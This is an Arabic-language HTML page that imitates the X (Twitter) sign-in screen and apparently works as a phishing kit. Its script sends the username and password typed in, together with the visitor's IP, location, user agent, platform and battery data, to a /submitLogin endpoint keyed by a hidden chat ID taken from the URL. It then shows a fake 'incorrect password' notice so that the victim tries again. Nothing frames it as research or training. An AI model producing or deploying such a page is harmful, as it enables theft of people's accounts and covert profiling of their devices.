<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى X</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: auto;
            padding: 20px;
        }
        .button {
            display: block;
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
        }
        .google-button {
            background-color: white;
            color: black;
        }
        .apple-button {
            background-color: white;
            color: black;
        }
        .input-field {
            width: calc(100% - 20px);
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 25px;
            font-size: 18px;
        }
        .divider {
            margin: 20px 0;
            border-bottom: 1px solid gray;
        }
        .link {
            color: blue;
            text-decoration: none;
        }
        .notification {
            position: fixed;
            top: 10px;
            right: 10px;
            background-color: #0095f6;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            z-index: 100;
            opacity: 0;
            transition: opacity 0.5s ease;
            display: none;
        }
        .notification.show {
            opacity: 1;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>تسجيل الدخول إلى X</h1>
        <button class="button google-button">تسجيل الدخول باستخدام Google</button>
        <button class="button apple-button">تسجيل الدخول باستخدام Apple</button>
        <div class="divider">أو</div>
        <form id="loginForm">
            <input type="hidden" name="chatId" id="chatIdInput">
            <input type="text" name="username" class="input-field" placeholder="الهاتف، أو البريد الإلكتروني، أو اسم المستخدم" required>
            <input type="password" name="password" class="input-field" placeholder="كلمة المرور" required>
            <button type="submit" class="button">تسجيل الدخول</button>
            <a href="#" class="link">نسيت كلمة المرور؟</a>
            <p>ليس لديك حساب؟ <a href="#" class="link">تسجيل</a></p>
        </form>
    </div>

    <div class="notification" id="notification">
        <p>كلمه السر او اسم المستخدم غير صحيحه يرجى استخدام اسم مستخدم وكلمه سر صحيحه او قوم بتسجيل عن طريق الإيميل او رقم الهاتف .</p>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const chatIdInput = document.getElementById('chatIdInput');
        const notification = document.getElementById('notification');

        const chatId = window.location.pathname.split('/').pop();
        chatIdInput.value = chatId;

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city
                };
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    city: 'Unknown'
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            let platform = "Unknown";
            if (/Windows/.test(ua)) platform = "Windows";
            else if (/Mac/.test(ua)) platform = "MacOS";
            else if (/Linux/.test(ua)) platform = "Twitter";
            else if (/Android/.test(ua)) platform = "Android";
            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

            return {
                platform: platform,
                userAgent: ua
            };
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        batteryLevel: battery.level,
                        batteryCharging: battery.charging
                    };
                } catch (error) {
                    console.error('Error getting battery info:', error);
                }
            }
            return {
                batteryLevel: undefined,
                batteryCharging: undefined
            };
        }

        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const formData = new FormData(loginForm);
            const data = Object.fromEntries(formData.entries());

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();
            const batteryInfo = await getBatteryInfo();
            const deviceVersion = getDeviceVersion();

            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });

            try {
                const response = await fetch('/submitLogin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                if (result.success) {
                    notification.classList.add('show');
                    setTimeout(() => {
                        notification.classList.remove('show');
                    }, 5000);
                    loginForm.reset();
                } else {
                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
            }
        });
    </script>
</body>
</html>
